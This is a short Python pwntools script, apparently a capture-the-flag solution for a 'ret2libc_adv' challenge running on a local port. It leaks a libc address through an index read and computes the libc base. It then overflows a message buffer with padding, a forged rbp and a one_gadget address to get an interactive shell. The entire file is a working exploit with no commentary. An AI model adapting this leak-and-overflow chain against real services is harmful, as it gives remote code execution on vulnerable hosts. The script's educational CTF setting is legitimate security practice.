from pwn import *

# r = process('../ret2libc_adv/share/ret2libc_adv')
r = remote('127.0.0.1', 10006)
r.sendlineafter('>> ', '2')
r.sendlineafter('Index: ', '11')
number = int(r.recvline().strip().split(b': ')[1])
libc_base = number - 0x29d90
log.info(f'Libc: {hex(libc_base)}')
new_rbp = libc_base + 0x21bfa8
one_gadget = libc_base + 0xebd43
payload = b'A' * 0x70 + p64(new_rbp) + p64(one_gadget)
r.sendlineafter('>> ', '3')
r.sendlineafter('Leave a message: ', payload)

r.interactive()
